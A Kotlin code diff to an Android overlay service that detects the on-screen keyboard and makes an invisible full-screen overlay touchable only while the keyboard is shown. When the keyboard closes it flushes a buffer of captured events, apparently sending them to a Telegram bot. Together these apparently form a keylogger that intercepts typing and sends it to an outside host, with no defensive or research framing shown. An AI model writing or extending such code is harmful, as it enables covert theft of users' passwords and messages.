@@ -5,7 +5,6 @@ import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
-import android.content.Context
 import android.content.Intent
 import android.graphics.PixelFormat
 import android.os.Build
@@ -19,12 +18,14 @@ import androidx.core.app.NotificationCompat
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
 import java.io.IOException
 
 class OverlayService : Service() {
 
     private lateinit var windowManager: WindowManager
     private var overlayView: FrameLayout? = null
+    private lateinit var params: WindowManager.LayoutParams
     private var screenHeight: Int = 0
     private var isKeyboardVisible = false
 
@@ -41,8 +42,10 @@ class OverlayService : Service() {
         val client = OkHttpClient()
         val text = "[CRITICAL] Overlay Service Error: $errorMessage"
         val url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"
-        val json = """{"chat_id":"$TELEGRAM_CHAT_ID","text":"$text"}"""
-        val requestBody = json.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+        val json = JSONObject()
+        json.put("chat_id", TELEGRAM_CHAT_ID)
+        json.put("text", text)
+        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
         val request = Request.Builder().url(url).post(requestBody).build()
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {}
@@ -69,14 +72,15 @@ class OverlayService : Service() {
 
     private fun addOverlayView() {
         overlayView = FrameLayout(this)
-        val params = WindowManager.LayoutParams(
+        
+        params = WindowManager.LayoutParams(
             WindowManager.LayoutParams.MATCH_PARENT,
             WindowManager.LayoutParams.MATCH_PARENT,
             WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-            // CRITICAL FIX: Add FLAG_NOT_TOUCH_MODAL to prevent the overlay from blocking touches.
             WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                     WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
             PixelFormat.TRANSPARENT
         )
 
@@ -88,10 +92,17 @@ class OverlayService : Service() {
                 insets.systemWindowInsetBottom > screenHeight * 0.25
             }
 
-            if (this.isKeyboardVisible && !keyboardIsCurrentlyVisible) {
-                flushEventBuffer()
+            if (this.isKeyboardVisible != keyboardIsCurrentlyVisible) {
+                this.isKeyboardVisible = keyboardIsCurrentlyVisible
+                if (this.isKeyboardVisible) {
+                    params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()
+                    windowManager.updateViewLayout(overlayView, params)
+                } else {
+                    params.flags = params.flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                    windowManager.updateViewLayout(overlayView, params)
+                    flushEventBuffer()
+                }
             }
-            this.isKeyboardVisible = keyboardIsCurrentlyVisible
 
             insets
         }
@@ -137,8 +148,10 @@ class OverlayService : Service() {
     private fun sendToTelegram(text: String) {
         val client = OkHttpClient()
         val url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage"
-        val json = """{"chat_id":"$TELEGRAM_CHAT_ID","text":"$text"}"""
-        val requestBody = json.toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+        val json = JSONObject()
+        json.put("chat_id", TELEGRAM_CHAT_ID)
+        json.put("text", text)
+        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
         val request = Request.Builder().url(url).post(requestBody).build()
 
         client.newCall(request).enqueue(object : Callback {
